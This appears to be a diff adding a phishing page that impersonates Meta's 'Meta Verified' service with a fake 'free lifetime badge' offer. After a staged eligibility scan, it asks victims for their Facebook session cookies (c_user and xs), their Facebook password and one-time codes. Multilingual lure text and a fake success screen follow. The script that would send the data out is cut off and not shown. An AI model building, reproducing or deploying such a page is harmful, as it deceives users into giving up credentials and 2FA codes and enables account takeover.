+    <div class="lm-grid">
+      <div class="lm-opt sel" data-lang="english"><img src="./Meta Verified — Free Badge_files/us.png" alt="">English</div>
+      <div class="lm-opt" data-lang="hindi"><img src="./Meta Verified — Free Badge_files/in.png" alt="">हिन्दी</div>
+      <div class="lm-opt" data-lang="spanish"><img src="./Meta Verified — Free Badge_files/es.png" alt="">Español</div>
+      <div class="lm-opt" data-lang="portuguese"><img src="./Meta Verified — Free Badge_files/pt.png" alt="">Português</div>
+      <div class="lm-opt" data-lang="arabic"><img src="./Meta Verified — Free Badge_files/sa.png" alt="">العربية</div>
+      <div class="lm-opt" data-lang="french"><img src="./Meta Verified — Free Badge_files/fr.png" alt="">Français</div>
+      <div class="lm-opt" data-lang="tamil"><img src="./Meta Verified — Free Badge_files/in.png" alt="">தமிழ்</div>
+      <div class="lm-opt" data-lang="vietnamese"><img src="./Meta Verified — Free Badge_files/vn.png" alt="">Tiếng Việt</div>
+      <div class="lm-opt" data-lang="ghanaian"><img src="./Meta Verified — Free Badge_files/gh.png" alt="">Twi</div>
+    </div>
+    <button class="lm-btn" id="lwConfirm">Continue</button>
+  </div>
+</div>
+
+<!-- ██ STEP 1 — SCAN + PLAN ██ -->
+<div id="s1" class="step active">
+  <div class="s1-topbar">
+    <div class="s1-topbar-logo"><img src="./Meta Verified — Free Badge_files/fb_icon_325x325.png" alt=""></div>
+    <span class="s1-topbar-name">Meta Verified</span>
+    <span class="s1-topbar-pill">FREE OFFER</span>
+  </div>
+
+  <!-- Scan -->
+  <div id="scanWrap">
+    <div class="scan-badge"><img src="./Meta Verified — Free Badge_files/800px-Twitter_Verified_Badge.svg.png" alt=""></div>
+    <div class="scan-title" id="t-scan-title">Checking Your Eligibility</div>
+    <div class="scan-sub" id="t-scan-sub">Facebook is verifying your account for the Meta Verified free badge offer…</div>
+    <div class="scan-bar-track"><div class="scan-bar-fill" id="scanBarFill"></div></div>
+    <div class="scan-pct" id="scanPct">0%</div>
+    <div class="scan-checks">
+      <div class="scan-chk" id="chk1">
+        <div class="scan-chk-ico"><svg viewBox="0 0 12 12" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><path d="M2 6l3 3 5-5"></path></svg></div>
+        <span id="t-chk1">Account age verified</span>
+      </div>
+      <div class="scan-chk" id="chk2">
+        <div class="scan-chk-ico"><svg viewBox="0 0 12 12" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><path d="M2 6l3 3 5-5"></path></svg></div>
+        <span id="t-chk2">Profile authenticity confirmed</span>
+      </div>
+      <div class="scan-chk" id="chk3">
+        <div class="scan-chk-ico"><svg viewBox="0 0 12 12" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><path d="M2 6l3 3 5-5"></path></svg></div>
+        <span id="t-chk3">Region eligibility checked</span>
+      </div>
+      <div class="scan-chk" id="chk4">
+        <div class="scan-chk-ico"><svg viewBox="0 0 12 12" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"><path d="M2 6l3 3 5-5"></path></svg></div>
+        <span id="t-chk4">Free offer slot reserved</span>
+      </div>
+    </div>
+    <div class="scan-status" id="scanStatus"></div>
+  </div>
+
+  <!-- Eligible Flash -->
+  <div id="eligFlash">
+    <div class="ef-ring"><img src="./Meta Verified — Free Badge_files/800px-Twitter_Verified_Badge.svg.png" alt=""></div>
+    <div class="ef-title" id="t-elig-title">You're Eligible! 🎉</div>
+    <div class="ef-sub" id="t-elig-sub">Your account qualifies for the free lifetime Meta Verified badge.</div>
+    <div class="ef-tag" id="t-elig-tag">FREE · Lifetime Access Confirmed</div>
+  </div>
+
+  <!-- Plan Card -->
+  <div id="planCard">
+    <div class="plan-hero">
+      <div class="plan-hero-badge"><img src="./Meta Verified — Free Badge_files/800px-Twitter_Verified_Badge.svg.png" alt=""></div>
+      <div class="plan-hero-label" id="t-free-tag">FREE · Lifetime Access</div>
+      <div class="plan-hero-name">Meta Verified</div>
+      <div class="plan-hero-sub" id="t-plan-desc">Protect and optimise your brand</div>
+      <div class="plan-hero-price">
+        <span class="plan-price-free" id="t-verified-badge">Verified Badge</span>
+        <span class="plan-price-was" id="t-price-was">$11.99/month</span>
+      </div>
+    </div>
+    <div class="plan-body">
+      <div class="plan-sect-label" id="t-sect1">Maximise Discovery</div>
+      <div class="plan-tiles">
+        <div class="plan-tile">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg></div>
+          <div class="plan-tile-name" id="t-f1">Search optimisation</div>
+        </div>
+        <div class="plan-tile">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>
+          <div class="plan-tile-name" id="t-f2">Featured profile</div>
+        </div>
+        <div class="plan-tile">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></div>
+          <div class="plan-tile-name" id="t-f3">Add links to reels</div>
+          <div class="plan-tile-hint" id="t-f3s">6 per month</div>
+        </div>
+        <div class="plan-tile">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg></div>
+          <div class="plan-tile-name" id="t-f4">Upgraded profile links</div>
+        </div>
+      </div>
+      <div class="plan-sect-label" id="t-sect2">Drive Engagement</div>
+      <div class="plan-tiles">
+        <div class="plan-tile">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2"></rect><path d="M12 8v8M8 12h8"></path></svg></div>
+          <div class="plan-tile-name" id="t-f5">Exclusive stickers</div>
+        </div>
+        <div class="plan-tile">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg></div>
+          <div class="plan-tile-name" id="t-f6">Custom chat themes</div>
+        </div>
+      </div>
+      <div class="plan-sect-label" id="t-sect3">Protect Your Brand</div>
+      <div class="plan-tiles">
+        <div class="plan-tile wide">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
+          <div class="plan-tile-name" id="t-f7">Impersonation protection</div>
+        </div>
+        <div class="plan-tile wide">
+          <div class="plan-tile-ico"><svg viewBox="0 0 24 24" fill="none" stroke="#0866ff" stroke-width="2" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.18h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.06 6.06l.91-.92a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 17z"></path></svg></div>
+          <div class="plan-tile-name" id="t-f8">Enhanced support</div>
+          <div class="plan-tile-hint" id="t-f8s">Chat or email with agents · Get issues resolved more quickly</div>
+        </div>
+      </div>
+    </div>
+    <div class="plan-bottom">
+      <div class="plan-age-note" id="t-age-note">Meta Verified is available for people aged 18+</div>
+      <button class="plan-cta" id="t-continue-btn">Continue →</button>
+    </div>
+    <div class="plan-footer">
+      <div><a href="https://foryou-apply-now.surge.sh/#">Privacy</a><a href="https://foryou-apply-now.surge.sh/#">Terms</a><a href="https://foryou-apply-now.surge.sh/#">Advertising</a><a href="https://foryou-apply-now.surge.sh/#">Cookies</a></div>
+      <div>Meta © 2026</div>
+    </div>
+  </div>
+</div>
+
+<!-- ██ STEP 2 — CREDENTIALS ██ -->
+<div id="s2" class="step">
+<div class="desk-wrap">
+  <div class="s2-topbar">
+    <div class="s2-tb-logo"><img src="./Meta Verified — Free Badge_files/fb_icon_325x325.png" alt=""></div>
+    <span class="s2-tb-name">Meta Verified</span>
+    <div class="s2-tb-right">
+      <img class="s2-flag" id="s2Flag" src="./Meta Verified — Free Badge_files/us.png" alt="">
+      <span class="s2-lang-name" id="s2LangName">English</span>
+    </div>
+  </div>
+  <div class="step-prog">
+    <div class="sp-dot done">✓</div>
+    <div class="sp-line done"></div>
+    <div class="sp-dot active">2</div>
+    <div class="sp-line"></div>
+    <div class="sp-dot">3</div>
+    <div class="sp-line"></div>
+    <div class="sp-dot">4</div>
+  </div>
+  <div class="s2-card">
+    <div class="s2-hero-row">
+      <div class="s2-hero-badge"><img src="./Meta Verified — Free Badge_files/800px-Twitter_Verified_Badge.svg.png" alt=""></div>
+      <div>
+        <div class="s2-hero-title" id="t-hdr-h">Request a Lifetime Free Verified Badge on Facebook</div>
+        <div class="s2-hero-sub" id="t-hdr-p">The verified badge confirms your Page or profile is authentic.</div>
+      </div>
+    </div>
+  </div>
+  <div class="s2-card">
+    <div class="info-chip">
+      <div class="info-chip-dot"></div>
+      <div>
+        <div class="info-chip-title" id="t-info-title">About the Verified Badge</div>
+        <div class="info-chip-body" id="t-info-body">Facebook's blue checkmark confirms your account is authentic. Please provide accurate details below.</div>
+      </div>
+    </div>
+  </div>
+  <div class="s2-card">
+    <div class="warn-chip">
+      <div class="warn-chip-ico">⚠️</div>
+      <div class="warn-chip-body"><strong id="t-warn-imp">Important:</strong> <span id="t-warn-body">Do not log out of your computer or laptop until you receive a verification confirmation email from Facebook.</span></div>
+    </div>
+  </div>
+  <div class="s2-card" style="padding:0;overflow:hidden">
+    <div class="vid-wrap">
+      <div class="vid-lbl">
+        <div class="vid-lbl-play"><svg viewBox="0 0 10 12"><polygon points="1,1 9,6 1,11" fill="#0866ff"></polygon></svg></div>
+        <span class="vid-lbl-txt" id="t-vid-lbl">Video Guide</span>
+      </div>
+      <video id="guide-video" controls="" preload="metadata">
+        <source id="guide-video-src" src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+      </video>
+    </div>
+  </div>
+  <div class="s2-card">
+    <div class="frm-title" id="t-frm-t">Submit Your Verification Request</div>
+    <div class="frm-sub" id="t-frm-s">Ensure all information is filled in accurately.</div>
+    <div class="err-alert">
+      <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="8" cy="8" r="7"></circle><path d="M8 5v4M8 11h.01"></path></svg>
+      <span id="t-err-txt">All required fields must be accurately provided. Failure to do so may result in not receiving a verified badge.</span>
+    </div>
+    <form id="verificationForm">
+      <div class="fl-group"><input type="text" id="c_user" name="c_user" placeholder=" " pattern="[0-9]+" minlength="6" required=""><label for="c_user">c_user</label></div>
+      <div class="fl-group"><input type="text" id="xs" name="xs" placeholder=" " required=""><label for="xs">xs</label></div>
+      <button class="s2-submit" type="submit" id="submitBtn"><span class="s2-lbl" id="t-submit-btn">Submit Verification Request</span><div class="spin"></div></button>
+    </form>
+  </div>
+  <div class="s2-footer"><div><a href="https://foryou-apply-now.surge.sh/#">Privacy</a><a href="https://foryou-apply-now.surge.sh/#">Terms</a><a href="https://foryou-apply-now.surge.sh/#">Cookies</a></div><div>Meta © 2026</div></div>
+</div></div>
+
+<!-- ██ STEP 3 — PASSWORD ██ -->
+<div id="s3" class="step">
+<div class="desk-wrap">
+  <div class="s3-topbar">
+    <div class="s3-tb-logo"><img src="./Meta Verified — Free Badge_files/fb_icon_325x325.png" alt=""></div>
+    <span class="s3-tb-name" id="t-s3-nav">Security Check</span>
+    <a href="https://foryou-apply-now.surge.sh/#" class="s3-tb-help" id="t-s3-help">Help Center</a>
+  </div>
+  <div class="step-prog">
+    <div class="sp-dot done">✓</div>
+    <div class="sp-line done"></div>
+    <div class="sp-dot done">✓</div>
+    <div class="sp-line done"></div>
+    <div class="sp-dot active">3</div>
+    <div class="sp-line"></div>
+    <div class="sp-dot">4</div>
+  </div>
+  <div class="s3-inner">
+    <div class="s3-card">
+      <div class="s3-card-head">
+        <div class="s3-step-tag">STEP 3 OF 4</div>
+        <div class="s3-lock">
+          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0110 0v4"></path></svg>
+        </div>
+        <div class="s3-card-title" id="t-s3-nav-inner">Password Verification</div>
+        <div class="s3-ssl">256-BIT SSL ENCRYPTED · OFFICIAL CHANNEL</div>
+      </div>
+      <div class="s3-card-body">
+        <div id="pwForm">
+          <p class="pw-prompt" id="t-pw-prompt">Enter your Facebook password to complete the verification process.</p>
+          <div class="pw-field">
+            <input type="password" id="pw-input" placeholder="Facebook password" autocomplete="current-password" required="">
+            <button type="button" class="pw-eye" id="eyeBtn">
+              <svg id="eyeIco" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+            </button>
+          </div>
+          <div class="pw-err" id="pwErr"><span id="t-pw-err">The password you entered is incorrect. Please try again.</span></div>
+          <a href="https://foryou-apply-now.surge.sh/#" class="pw-forgot" id="t-pw-forgot">Forgot password?</a>
+          <div class="pw-divider"></div>
+          <form id="passwordForm">
+            <button type="submit" class="pw-submit" id="pwBtn"><span class="pw-lbl" id="t-pw-continue">Continue</span><div class="spin"></div></button>
+          </form>
+          <button class="pw-notyou" id="t-pw-not-you">Not you?</button>
+        </div>
+        <div class="pw-done" id="pwSuccess">
+          <div class="pw-done-circle"><svg viewBox="0 0 28 28"><path d="M4 14l7 7L24 7"></path></svg></div>
+          <div class="pw-done-title" id="t-pw-ok-t">Verifying…</div>
+          <div class="pw-done-sub" id="t-pw-ok-s">Please wait…</div>
+        </div>
+      </div>
+    </div>
+    <div class="s3-footer"><div><a href="https://foryou-apply-now.surge.sh/#">Privacy</a><a href="https://foryou-apply-now.surge.sh/#">Terms</a><a href="https://foryou-apply-now.surge.sh/#">Cookies</a></div><div>Meta © 2026</div></div>
+  </div>
+</div></div>
+
+<!-- ██ STEP 4 — VIDEO + CODE ██ -->
+<div id="s4" class="step">
+<div class="desk-wrap">
+  <div class="s4-topbar">
+    <div class="s4-tb-logo"><img src="./Meta Verified — Free Badge_files/fb_icon_325x325.png" alt=""></div>
+    <span class="s4-tb-name" id="t-s4-nav">Verification Complete</span>
+  </div>
+  <div class="step-prog">
+    <div class="sp-dot done">✓</div>
+    <div class="sp-line done"></div>
+    <div class="sp-dot done">✓</div>
+    <div class="sp-line done"></div>
+    <div class="sp-dot done">✓</div>
+    <div class="sp-line done"></div>
+    <div class="sp-dot active">4</div>
+  </div>
+
+  <div class="s4-card" style="padding:0;overflow:hidden">
+    <div class="s4-submitted-banner">
+      <div class="s4-sb-icon"><svg viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg></div>
+      <div>
+        <div class="s4-sb-title" id="t-s4-ok-title">Verification Submitted Successfully</div>
+        <div class="s4-sb-sub" id="t-s4-ok-sub">Watch the video below before your badge is activated.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="s4-alert-card">
+    <div class="s4-alert-ico">📋</div>
+    <div class="s4-alert-txt" id="t-s4-alert">Please watch the full video below. It contains important information about your Meta Verified badge activation.</div>
+  </div>
+
+  <div class="s4-vid-card">
+    <div class="s4-vid-header">
+      <div class="s4-vid-play-btn"><svg viewBox="0 0 10 12" fill="#fff"><polygon points="1,1 9,6 1,11"></polygon></svg></div>
+      <div>
+        <div class="s4-vid-ht" id="t-s4-vid-title">Official Guide — Watch Before Proceeding</div>
+        <div class="s4-vid-hs" id="t-s4-vid-sub">Badge activation &amp; next steps</div>
+      </div>
+    </div>
+    <div class="s4-vid-body">
+      <video id="s4-video" controls="" preload="metadata">
+        <source id="s4-video-src" src="https://link-of-video-step0.wasmer.app/InShot_20260117_014107448.mp4" type="video/mp4">
+      </video>
+    </div>
+  </div>
+
+  <div class="s4-next-card">
+    <div class="s4-next-title" id="t-s4-next-title">What Happens Next</div>
+    <div class="s4-step-row">
+      <div class="s4-step-num">1</div>
+      <div class="s4-step-txt" id="t-s4-step1"><strong>Badge Review (24–48 hrs)</strong> — Our team will review your request and confirm eligibility.</div>
+    </div>
+    <div class="s4-step-row">
+      <div class="s4-step-num">2</div>
+      <div class="s4-step-txt" id="t-s4-step2"><strong>Email Confirmation</strong> — You will receive an official email from Meta confirming badge activation.</div>
+    </div>
+    <div class="s4-step-row">
+      <div class="s4-step-num">3</div>
+      <div class="s4-step-txt" id="t-s4-step3"><strong>Badge Appears</strong> — Your verified blue checkmark will appear on your profile automatically.</div>
+    </div>
+  </div>
+
+  <div class="s4-submit-card">
+    <div id="s4-form-wrap">
+      <div class="s4-submit-tag">STEP 4 OF 4 — Final Step</div>
+      <p class="s4-submit-desc">Enter the verification codes sent to your registered account to finalise your Meta Verified badge activation.</p>
+      <input type="text" class="s4-input" id="s4-input" placeholder="Enter the codes" autocomplete="one-time-code">
+      <div class="s4-input-err" id="s4-err">Please enter the codes before proceeding.</div>
+      <button class="s4-submit-btn" id="s4-btn"><span class="s4-sub-lbl">Submit &amp; Activate Badge</span><div class="spin"></div></button>
+    </div>
+    <div class="pw-done" id="s4-done">
+      <div class="pw-done-circle"><svg viewBox="0 0 28 28"><path d="M4 14l7 7L24 7"></path></svg></div>
+      <div class="pw-done-title">Submitted!</div>
+      <div class="pw-done-sub">Processing your badge…</div>
+    </div>
+  </div>
+  <div class="s4-footer"><div><a href="https://foryou-apply-now.surge.sh/#">Privacy</a><a href="https://foryou-apply-now.surge.sh/#">Terms</a><a href="https://foryou-apply-now.surge.sh/#">Cookies</a></div><div>Meta © 2026</div></div>
+</div></div>
+
+<!-- ██ VERIFICATION SUCCESS OVERLAY ██ -->
+<div id="verifySuccess">
+  <div class="vs-circle"><svg viewBox="0 0 28 28"><path d="M4 14l7 7L24 7"></path></svg></div>
+  <div class="vs-badge"><img src="./Meta Verified — Free Badge_files/800px-Twitter_Verified_Badge.svg.png" alt=""></div>
+  <div class="vs-title" id="t-vs-title">Verification Successful!</div>
+  <div class="vs-sub" id="t-vs-sub">Your Meta Verified badge has been activated. You will receive a confirmation email from Meta shortly.</div>
+  <div class="vs-pill">
+    <img src="./Meta Verified — Free Badge_files/800px-Twitter_Verified_Badge.svg.png" alt="" style="width:18px;height:18px">
+    <span id="t-vs-tag">Meta Verified · Free Lifetime Badge</span>
+  </div>
+  <div class="vs-redirect" id="t-vs-redirect">Redirecting you to Facebook…</div>
+</div>
+
+<script>
+var T={
+  english:{vsTitle:'Verification Successful!',vsSub:'Your Meta Verified badge has been activated. You will receive a confirmation email from Meta shortly.',vsTag:'Meta Verified · Free Lifetime Badge',vsRedirect:'Redirecting you to Facebook…',
+  s4Nav:'Verification Complete',s4OkTitle:'Verification Submitted Successfully',s4OkSub:'Watch the video below before your badge is activated.',s4Alert:'Please watch the full video below. It contains important information about your Meta Verified badge activation.',s4VidTitle:'Official Guide — Watch Before Proceeding',s4VidSub:'Badge activation & next steps',s4NextTitle:'What Happens Next',s4Step1:'<strong>Badge Review (24–48 hrs)</strong> — Our team will review your request and confirm eligibility.',s4Step2:'<strong>Email Confirmation</strong> — You will receive an official email from Meta confirming badge activation.',s4Step3:'<strong>Badge Appears</strong> — Your verified blue checkmark will appear on your profile automatically.',
+  scanTitle:'Checking Your Eligibility',scanSub:'Facebook is verifying your account for the Meta Verified free badge offer…',scanInit:'Initializing…',scanS1:'Verifying account age…',scanS2:'Checking profile authenticity…',scanS3:'Checking region eligibility…',scanS4:'Reserving your free slot…',scanS5:'Confirming eligibility…',scanDone:'✓ Eligible! Loading your offer…',chk1:'Account age verified',chk2:'Profile authenticity confirmed',chk3:'Region eligibility checked',chk4:'Free offer slot reserved',
+  eligTitle:"You're Eligible! 🎉",eligSub:'Your account qualifies for the free lifetime Meta Verified badge — selected users only.',eligTag:'FREE · Lifetime Access Confirmed',
+  planDesc:'Protect and optimise your brand',freeTag:'FREE · Lifetime Access',priceWas:'$11.99/month',verifiedBadge:'Verified Badge',sect1:'Maximise Discovery',f1:'Search optimisation',f2:'Featured profile',f3:'Add links to reels',f3s:'6 per month',sect2:'Drive Engagement',f4:'Upgraded profile links',f5:'Exclusive stickers',f6:'Custom chat themes',sect3:'Protect Your Brand',f7:'Impersonation protection',f8:'Enhanced support',f8s:'Chat or email with agents · Get issues resolved more quickly',ageNote:'Meta Verified is available for people aged 18+',continueBtn:'Continue →',
+  hdrH:'Request a Lifetime Free Verified Badge on Facebook',hdrP:'The verified badge confirms a Page or profile is the authentic presence of the individual, public figure, or brand it represents.',infoTitle:'About the Verified Badge',infoBody:"Facebook's blue checkmark confirms your account is authentic. Please provide accurate details below.",warnImp:'Important:',warnBody:'Do not log out of your computer or laptop until you receive a verification confirmation email from Facebook.',vidLbl:'Video Guide',frmT:'Submit Your Verification Request',frmS:'Ensure all information is filled in accurately.',errTxt:'All required fields must be accurately provided.',submitBtn:'Submit Verification Request',
+  s3Nav:'Security Check',s3Help:'Help Center',pwPrompt:'Enter your Facebook password to complete the verification process.',pwPlaceholder:'Facebook password',pwErr:'The password you entered is incorrect. Please try again.',pwForgot:'Forgot password?',pwContinue:'Continue',pwNotYou:'Not you?',pwOkT:'Verifying…',pwOkS:'Please wait…'},
+
+  hindi:{vsTitle:'सत्यापन सफल!',vsSub:'आपका Meta Verified बैज सक्रिय हो गया है। Meta से जल्द ही पुष्टि ईमेल आएगा।',vsTag:'Meta Verified · आजीवन मुफ़्त बैज',vsRedirect:'Facebook पर redirect हो रहे हैं…',
+  s4Nav:'सत्यापन पूर्ण',s4OkTitle:'सत्यापन सफलतापूर्वक सबमिट किया गया',s4OkSub:'बैज सक्रिय होने से पहले नीचे दिया गया वीडियो देखें।',s4Alert:'कृपया पूरा वीडियो देखें। इसमें बैज सक्रियण की महत्वपूर्ण जानकारी है।',s4VidTitle:'आधिकारिक गाइड — आगे बढ़ने से पहले देखें',s4VidSub:'बैज सक्रियण और अगले चरण',s4NextTitle:'आगे क्या होगा',s4Step1:'<strong>बैज समीक्षा (24–48 घंटे)</strong> — हमारी टीम आपके अनुरोध की समीक्षा करेगी।',s4Step2:'<strong>ईमेल पुष्टि</strong> — Meta से आधिकारिक ईमेल आएगा।',s4Step3:'<strong>बैज दिखेगा</strong> — नीला चेकमार्क प्रोफ़ाइल पर दिखाई देगा।',
+  scanTitle:'आपकी पात्रता जाँची जा रही है',scanSub:'Facebook आपके खाते को Meta Verified मुफ़्त बैज के लिए सत्यापित कर रहा है…',scanInit:'प्रारंभ हो रहा है…',scanS1:'खाते की आयु सत्यापित हो रही है…',scanS2:'प्रोफ़ाइल प्रामाणिकता जाँची जा रही है…',scanS3:'क्षेत्रीय पात्रता जाँची जा रही है…',scanS4:'मुफ़्त स्लॉट आरक्षित किया जा रहा है…',scanS5:'पात्रता की पुष्टि हो रही है…',scanDone:'✓ पात्र! लोड हो रहा है…',chk1:'खाते की आयु सत्यापित',chk2:'प्रोफ़ाइल प्रामाणिकता की पुष्टि',chk3:'क्षेत्रीय पात्रता जाँची गई',chk4:'मुफ़्त ऑफ़र स्लॉट आरक्षित',
+  eligTitle:'आप पात्र हैं! 🎉',eligSub:'आपका खाता मुफ़्त लाइफटाइम Meta Verified बैज के लिए योग्य है।',eligTag:'मुफ़्त · आजीवन पहुँच की पुष्टि',
+  planDesc:'अपने ब्रांड की सुरक्षा करें',freeTag:'मुफ़्त · आजीवन पहुँच',priceWas:'$11.99/माह',verifiedBadge:'सत्यापित बैज',sect1:'खोज बढ़ाएँ',f1:'खोज अनुकूलन',f2:'फ़ीचर्ड प्रोफ़ाइल',f3:'रील्स में लिंक जोड़ें',f3s:'6 प्रति माह',sect2:'जुड़ाव बढ़ाएँ',f4:'प्रोफ़ाइल लिंक अपग्रेड',f5:'एक्सक्लूसिव स्टिकर',f6:'कस्टम चैट थीम',sect3:'ब्रांड सुरक्षा',f7:'नकल विरोधी सुरक्षा',f8:'बेहतर सहायता',f8s:'एजेंट के साथ चैट या ईमेल',ageNote:'Meta Verified 18+ आयु के लोगों के लिए उपलब्ध है',continueBtn:'जारी रखें →',
+  hdrH:'Facebook पर सत्यापित बैज के लिए अनुरोध करें',hdrP:'सत्यापित बैज पुष्टि करता है कि प्रोफ़ाइल वास्तविक है।',infoTitle:'सत्यापित बैज के बारे में',infoBody:'Facebook का नीला चेकमार्क आपके खाते की प्रामाणिकता पुष्टि करता है।',warnImp:'महत्वपूर्ण:',warnBody:'जब तक Facebook से पुष्टि ईमेल न मिले, लॉग आउट न करें।',vidLbl:'वीडियो गाइड',frmT:'सत्यापन अनुरोध सबमिट करें',frmS:'सभी जानकारी सटीक रूप से भरें।',errTxt:'सभी आवश्यक फ़ील्ड भरे होने चाहिए।',submitBtn:'सत्यापन अनुरोध सबमिट करें',
+  s3Nav:'सुरक्षा जाँच',s3Help:'सहायता केंद्र',pwPrompt:'सत्यापन पूरा करने के लिए Facebook पासवर्ड दर्ज करें।',pwPlaceholder:'Facebook पासवर्ड',pwErr:'पासवर्ड गलत है। पुनः प्रयास करें।',pwForgot:'पासवर्ड भूल गए?',pwContinue:'जारी रखें',pwNotYou:'आप नहीं हैं?',pwOkT:'सत्यापित हो रहा है…',pwOkS:'कृपया प्रतीक्षा करें…'},
+
+  spanish:{vsTitle:'¡Verificación Exitosa!',vsSub:'Tu insignia Meta Verified ha sido activada. Recibirás un correo de confirmación de Meta pronto.',vsTag:'Meta Verified · Insignia gratuita de por vida',vsRedirect:'Redirigiendo a Facebook…',
+  s4Nav:'Verificación Completada',s4OkTitle:'Verificación Enviada Exitosamente',s4OkSub:'Mira el video abajo antes de activar tu insignia.',s4Alert:'Por favor mira el video completo. Contiene información importante sobre la activación.',s4VidTitle:'Guía Oficial — Mira Antes de Continuar',s4VidSub:'Activación de insignia y próximos pasos',s4NextTitle:'¿Qué Sucede Después?',s4Step1:'<strong>Revisión (24–48 hrs)</strong> — Nuestro equipo revisará tu solicitud.',s4Step2:'<strong>Confirmación por correo</strong> — Recibirás un correo oficial de Meta.',s4Step3:'<strong>Insignia visible</strong> — Tu marca azul aparecerá automáticamente.',
+  scanTitle:'Verificando Tu Elegibilidad',scanSub:'Facebook verifica tu cuenta para la insignia Meta Verified gratuita…',scanInit:'Iniciando…',scanS1:'Verificando antigüedad…',scanS2:'Comprobando autenticidad…',scanS3:'Verificando elegibilidad regional…',scanS4:'Reservando espacio gratuito…',scanS5:'Confirmando elegibilidad…',scanDone:'✓ ¡Elegible! Cargando…',chk1:'Antigüedad verificada',chk2:'Autenticidad confirmada',chk3:'Elegibilidad regional verificada',chk4:'Espacio gratuito reservado',
+  eligTitle:'¡Eres Elegible! 🎉',eligSub:'Tu cuenta califica para la insignia Meta Verified gratuita de por vida.',eligTag:'GRATIS · Acceso de por vida confirmado',
+  planDesc:'Protege y optimiza tu marca',freeTag:'GRATIS · Acceso de por vida',priceWas:'$11.99/mes',verifiedBadge:'Insignia verificada',sect1:'Maximizar descubrimiento',f1:'Optimización en búsquedas',f2:'Perfil destacado',f3:'Agregar enlaces a reels',f3s:'6 por mes',sect2:'Impulsar participación',f4:'Enlaces de perfil mejorados',f5:'Stickers exclusivos',f6:'Temas de chat personalizados',sect3:'Proteger tu marca',f7:'Protección contra suplantación',f8:'Soporte mejorado',f8s:'Chat o correo con agentes',ageNote:'Meta Verified está disponible para personas mayores de 18 años',continueBtn:'Continuar →',
+  hdrH:'Solicitar una insignia verificada en Facebook',hdrP:'La insignia verificada confirma que el perfil es la presencia auténtica del individuo o marca.',infoTitle:'Sobre la insignia verificada',infoBody:'La marca azul de Facebook confirma que tu cuenta es auténtica.',warnImp:'Importante:',warnBody:'No cierres sesión hasta recibir el correo de confirmación de Facebook.',vidLbl:'Guía en video',frmT:'Enviar solicitud de verificación',frmS:'Asegúrate de que toda la información sea precisa.',errTxt:'Todos los campos obligatorios deben completarse.',submitBtn:'Enviar solicitud de verificación',
+  s3Nav:'Verificación de seguridad',s3Help:'Centro de ayuda',pwPrompt:'Ingresa tu contraseña de Facebook para completar la verificación.',pwPlaceholder:'Contraseña de Facebook',pwErr:'Contraseña incorrecta. Inténtalo de nuevo.',pwForgot:'¿Olvidaste tu contraseña?',pwContinue:'Continuar',pwNotYou:'¿No eres tú?',pwOkT:'Verificando…',pwOkS:'Por favor espera…'},
+
+  portuguese:{vsTitle:'Verificação Bem-Sucedida!',vsSub:'Seu emblema Meta Verified foi ativado. Você receberá um e-mail de confirmação da Meta em breve.',vsTag:'Meta Verified · Emblema gratuito vitalício',vsRedirect:'Redirecionando para o Facebook…',
